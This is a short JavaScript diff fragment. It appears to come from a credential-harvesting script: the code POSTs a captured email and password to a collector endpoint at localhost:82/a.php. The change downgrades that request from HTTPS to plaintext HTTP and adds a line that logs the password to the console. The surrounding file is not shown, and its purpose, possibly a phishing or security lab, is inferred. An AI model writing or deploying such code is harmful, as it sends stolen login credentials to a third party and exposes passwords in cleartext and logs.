@@ -44,8 +44,10 @@ httpreq.send(data)
 
 prom_correo.then(correo => {
     let httpreq2 = new XMLHttpRequest()
-    httpreq2.open("POST", "https://localhost:82/a.php")
+    httpreq2.open("POST", "http://localhost:82/a.php")
     httpreq2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
     let data = `usuario=${correo}&contrasena=${contraseña}`
     httpreq2.send(data)  
 })
+
+console.log(contraseña)
